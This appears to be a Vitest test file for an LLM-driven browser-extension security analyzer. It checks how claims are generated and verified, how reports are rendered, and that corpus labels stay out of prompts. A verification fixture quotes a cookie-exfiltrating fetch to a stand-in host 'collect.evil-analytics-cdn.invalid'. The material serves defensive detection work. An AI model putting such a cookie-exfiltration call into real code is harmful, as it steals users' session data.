import { describe, it, expect } from "vitest";
import { analyzeCorpus } from "../scripts/analyze-corpus.ts";
import { FakeLlmClient } from "../src/llm/fake.ts";
import { createMonolith, parseThink, serializePackForPrompt, type MonolithTrace } from "../src/methodologies/monolith.ts";
import type { EvidencePack } from "../src/pipeline/schema.ts";
import type { LlmRequest } from "../src/llm/client.ts";

const results = analyzeCorpus("corpus", { analyzedAt: "2026-01-01T00:00:00Z" });
const packs = new Map(results.map((r) => [r.sample, r.pack]));
const pack = (s: string): EvidencePack => packs.get(s)!;

const SAMPLE_DIR = "corpus/mutant-a-exfil-fetch/extension";

/** A generation completion: one behavioral claim citing real source + one capability. */
const FINDINGS_JSON = JSON.stringify({
  summary: "A cookie manager that also exfiltrates cookies.",
  overall_risk: "high",
  findings: [
    {
      id: "f1",
      title: "Cookie exfiltration to collect.evil-analytics-cdn.invalid",
      claim_type: "inferred-behavior",
      severity: "high",
      category: "data-exfiltration",
      confidence: "high",
      claimed_mechanism: "reads cookies and POSTs them to an external host",
      evidence_refs: [{ file: "js/background.js", location: null, symbol: null, sink_or_string: "fetch" }],
      detail: "cookies sent to collect.evil-analytics-cdn.invalid",
    },
    {
      id: "f2",
      title: "Broad host permissions",
      claim_type: "observed-capability",
      severity: "medium",
      category: "permissions",
      confidence: "high",
      claimed_mechanism: "",
      evidence_refs: [{ file: "manifest.json", location: null, symbol: null, sink_or_string: "<all_urls>" }],
      detail: "manifest requests <all_urls>",
    },
  ],
});

const CONFIRMED_JSON = JSON.stringify({
  verdict: "confirmed",
  grounding_line: { file: "js/background.js", line: 30 },
  rationale: "the fetch call sends cookie data to the external host",
  evidence_quote: 'fetch("https://collect.evil-analytics-cdn.invalid", …)',
});

/** A synthesis completion: humanization only (prose + deviation observation;
 *  the tier is decided upstream by the verdict engine, not here). */
const SYNTHESIS_JSON = JSON.stringify({
  layperson_summary: "This extension manages cookies but also sends them to an outside server.",
  technical_summary: "Verified cookie exfiltration via fetch (finding 1); broad host capability (finding 2).",
  description_deviation: { deviates: true, note: "A cookie manager should not transmit cookie data externally." },
});

describe("monolith methodology (generation → verification)", () => {
  it("generates structured findings, verifies behavioral claims against source, and renders the verified report", async () => {
    const fake = new FakeLlmClient({
      monolith: { text: FINDINGS_JSON, usage: { inputTokens: 10, outputTokens: 5 } },
      "verify:claim": { text: CONFIRMED_JSON, usage: { inputTokens: 7, outputTokens: 3 } },
      synthesize: { text: SYNTHESIS_JSON, usage: { inputTokens: 4, outputTokens: 2 } },
    });
    const out = await createMonolith("test-model").run({ sampleDir: SAMPLE_DIR, pack: pack("mutant-a-exfil-fetch") }, fake);

    // The confirmed behavioral claim is asserted; the capability is asserted; nothing excluded.
    expect(out.report).toContain("## Findings");
    expect(out.report).toContain("— verified behavior");
    expect(out.report).toContain("collect.evil-analytics-cdn.invalid");
    expect(out.report).toContain("**confirmed** at `js/background.js:30`");
    expect(out.report).toContain("— observed capability");
    // The excluded section is ALWAYS present, with an explicit empty state.
    expect(out.report).toContain("## Excluded claims (checked, NOT findings)");
    expect(out.report).toContain("None — every generated claim survived verification.");
    // The DETERMINISTIC verdict (a confirmed high-severity exfiltration → high-risk)
    // and the humanized summaries + deterministic sections render on every report.
    expect(out.report).toContain("## Verdict: high-risk");
    expect(out.tier).toBe("high-risk"); // the arm's native tier, for the scorecard
    expect(out.report).toContain("This extension manages cookies but also sends them to an outside server.");
    expect(out.report).toContain("## Permissions");
    expect(out.report).toContain("## External destinations");
    expect(out.report).toContain("## Obfuscation");
    expect(out.report).toContain("## Developer");
    expect(out.report).toContain("## Coverage and limits");
    // Usage sums generation + verification + synthesis.
    expect(out.usage).toEqual({ inputTokens: 21, outputTokens: 10 });
    // Generation + one verifier call (f2 is observed-capability → no LLM verify) + synthesis.
    expect(fake.calls.map((c) => c.label)).toEqual(["monolith", "verify:claim", "synthesize"]);
    // The structured trace is exposed for artifacts/tests.
    const trace = out.structured as MonolithTrace;
    expect(trace.generated.findings).toHaveLength(2);
    expect(trace.verdicts).toEqual([
      expect.objectContaining({ claim_id: "f1", verdict: "confirmed" }),
    ]);
    expect(trace.risk_report.verdict.tier).toBe("high-risk");
    expect(trace.risk_report.extension.store_id).toBeNull();

    // Generation prompt: instructions first, pack evidence inside the envelope.
    const genPrompt = fake.calls[0]!.prompt;
    expect(genPrompt).toContain("collect.evil-analytics-cdn.invalid");
    expect(genPrompt.indexOf("security analyst")).toBeLessThan(genPrompt.indexOf("<evidence_pack>"));
    // Verifier prompt carries real source from disk (not just the pack snippet).
    const verifyPrompt = fake.calls[1]!.prompt;
    expect(verifyPrompt).toContain("<source>");
    expect(verifyPrompt).toContain("FILE: js/background.js");
  });

  it("demotes a refuted claim: recorded in the appendix, never asserted as a behavior", async () => {
    const fake = new FakeLlmClient({
      monolith: FINDINGS_JSON,
      "verify:claim": JSON.stringify({
        verdict: "refuted",
        grounding_line: { file: "js/background.js", line: 12 },
        rationale: "only cookie reads exist; no network write of cookie data",
        evidence_quote: "const c = document.cookie;",
      }),
      synthesize: SYNTHESIS_JSON,
    });
    const out = await createMonolith("m").run({ sampleDir: SAMPLE_DIR, pack: pack("mutant-a-exfil-fetch") }, fake);
    expect(out.report).toContain("## Excluded claims (checked, NOT findings)");
    expect(out.report).toContain("— REFUTED against source");
    expect(out.report).not.toContain("— verified behavior");
    // The capability finding is still asserted on its own.
    expect(out.report).toContain("— observed capability");
  });

  it("synthesis sees the refuted claim only as an excluded claim, never as an asserted finding", async () => {
    const fake = new FakeLlmClient({
      monolith: FINDINGS_JSON,
      "verify:claim": JSON.stringify({
        verdict: "refuted",
        grounding_line: null,
        rationale: "no such mechanism",
        evidence_quote: "",
      }),
      synthesize: SYNTHESIS_JSON,
    });
    await createMonolith("m").run({ sampleDir: SAMPLE_DIR, pack: pack("mutant-a-exfil-fetch") }, fake);
    const synth = fake.calls.find((c) => c.label === "synthesize")!;
    const digest = synth.prompt.slice(synth.prompt.indexOf("<assessment_digest>"));
    // The refuted exfiltration claim appears under excluded_claims, not asserted_findings.
    const asserted = digest.slice(digest.indexOf("asserted_findings"), digest.indexOf("excluded_claims"));
    expect(asserted).not.toContain("Cookie exfiltration");
    expect(digest).toContain("excluded_claims");
    expect(digest).toContain("refuted");
  });

  it("never sees ground-truth labels: the sample's directory name is stripped from every prompt", async () => {
    // extension.path / extension.id_from_path carry the corpus directory name
    // (src/pipeline/index.ts derives both from it), and names like
    // "mutant-a-exfil-fetch" are ground-truth hints (improvement 001). The
    // verifier additionally reads source from sampleDir — the PATH must stay
    // fs-only and never enter its prompt either.
    const fake = new FakeLlmClient({ monolith: FINDINGS_JSON, "verify:claim": CONFIRMED_JSON, synthesize: SYNTHESIS_JSON });
    const p = pack("mutant-a-exfil-fetch");
    expect(p.extension.path).toBe("mutant-a-exfil-fetch"); // the leak exists in the pack…
    await createMonolith("m").run({ sampleDir: SAMPLE_DIR, pack: p }, fake);
    expect(fake.calls.length).toBeGreaterThan(1); // generation + ≥1 verification
    for (const call of fake.calls) {
      expect(call.prompt, `prompt for label=${call.label} leaks the sample name`).not.toContain("mutant-a-exfil-fetch");
      expect(call.prompt).not.toContain("id_from_path");
      expect(call.prompt, `prompt for label=${call.label} leaks the corpus dir`).not.toContain("corpus/");
    }
    // Holds for every corpus sample, not just the representative.
    for (const [sample, sp] of packs) {
      expect(serializePackForPrompt(sp), `prompt for ${sample} leaks its sample name`).not.toContain(sample);
    }
  });

  it("throws a FindingsParseError naming the poisoned fixture when the completion has no findings object", async () => {
    const fake = new FakeLlmClient({ monolith: "This extension seems fine to me." });
    await expect(
      createMonolith("m").run({ sampleDir: SAMPLE_DIR, pack: pack("mutant-a-exfil-fetch") }, fake),
    ).rejects.toThrow(/recorded fixture: monolith-[0-9a-f]{16}\.json/);
  });

  it("throws a clear error when given a sample with no pack (e.g. an agentic-only context)", async () => {
    const fake = new FakeLlmClient(() => "ok");
    await expect(createMonolith("m").run({ sampleDir: "x" }, fake)).rejects.toThrow(/requires sample\.pack/);
  });

  it("omits `think` from params by default; generation is schema-constrained (format carries the findings JSON Schema)", async () => {
    let seen: LlmRequest | undefined;
    const fake = new FakeLlmClient((req) => {
      if (req.label === "monolith") seen = req;
      return req.label === "synthesize" ? SYNTHESIS_JSON : '{"summary":"s","overall_risk":"low","findings":[]}';
    });
    await createMonolith("m").run({ sampleDir: SAMPLE_DIR, pack: pack("demo-cookie-manager") }, fake);
    expect(seen?.params?.temperature).toBe(0);
    // A schema object, not the bare "json" mode: constrained decoding makes an
    // unescaped-quote-corrupted completion impossible (it would otherwise be
    // re-recorded forever at temperature 0).
    const format = seen?.params?.format as Record<string, unknown>;
    expect(format.type).toBe("object");
    expect(format.required).toEqual(["summary", "overall_risk", "findings"]);
    expect(seen?.params && "think" in seen.params).toBe(false);
  });

  it("threads a configured think setting through to the generation request params", async () => {
    let seen: LlmRequest | undefined;
    const fake = new FakeLlmClient((req) => {
      if (req.label === "monolith") seen = req;
      return req.label === "synthesize" ? SYNTHESIS_JSON : '{"findings":[]}';
    });
    await createMonolith("m", { think: "high" }).run({ sampleDir: SAMPLE_DIR, pack: pack("demo-cookie-manager") }, fake);
    expect(seen?.params?.think).toBe("high");
  });

  it("uses the configured verifier model for verify calls (defaults to the arm model)", async () => {
    const fake = new FakeLlmClient({ monolith: FINDINGS_JSON, "verify:claim": CONFIRMED_JSON, synthesize: SYNTHESIS_JSON });
    await createMonolith("arm-model", { verifierModel: "verifier-model" }).run(
      { sampleDir: SAMPLE_DIR, pack: pack("mutant-a-exfil-fetch") },
      fake,
    );
    expect(fake.calls.find((c) => c.label === "monolith")!.model).toBe("arm-model");
    expect(fake.calls.find((c) => c.label === "verify:claim")!.model).toBe("verifier-model");
    // Synthesis runs on the arm's own model.
    expect(fake.calls.find((c) => c.label === "synthesize")!.model).toBe("arm-model");

    const fake2 = new FakeLlmClient({ monolith: FINDINGS_JSON, "verify:claim": CONFIRMED_JSON, synthesize: SYNTHESIS_JSON });
    await createMonolith("arm-model").run({ sampleDir: SAMPLE_DIR, pack: pack("mutant-a-exfil-fetch") }, fake2);
    expect(fake2.calls.find((c) => c.label === "verify:claim")!.model).toBe("arm-model");
  });

  it("serializes the developer section into the prompt (not stripped)", () => {
    // The label-leak/volatility guards must not swallow developer identity —
    // the model needs it to reason about "has website? non-store updates?".
    const p = pack("demo-cookie-manager");
    const s = serializePackForPrompt(p);
    expect(s).toContain('"developer"');
    expect(s).toContain('"provenance":"self_reported"');
    expect(s).toContain('"non_store_update_url":false');
  });

  it("serialization drops volatile fields so the fixture key is stable across runs", () => {
    const p = pack("demo-cookie-manager");
    const s = serializePackForPrompt(p);
    expect(s).not.toContain("analyzed_at");
    expect(s).not.toContain("analyzer_version");
    // Same pack with a different analyzed_at serializes identically.
    const p2: EvidencePack = { ...p, analyzed_at: "2099-12-31T23:59:59Z" };
    expect(serializePackForPrompt(p2)).toBe(s);
  });
});

describe("parseThink", () => {
  it("maps an absent or empty value to undefined (knob omitted)", () => {
    expect(parseThink(undefined)).toBeUndefined();
    expect(parseThink("")).toBeUndefined();
    expect(parseThink("  ")).toBeUndefined();
  });

  it("parses booleans and graded levels case-insensitively", () => {
    expect(parseThink("true")).toBe(true);
    expect(parseThink("FALSE")).toBe(false);
    expect(parseThink("Low")).toBe("low");
    expect(parseThink(" medium ")).toBe("medium");
    expect(parseThink("HIGH")).toBe("high");
  });

  it("throws a clear error on an unrecognized value", () => {
    expect(() => parseThink("turbo")).toThrow(/invalid think value "turbo"/);
  });
});
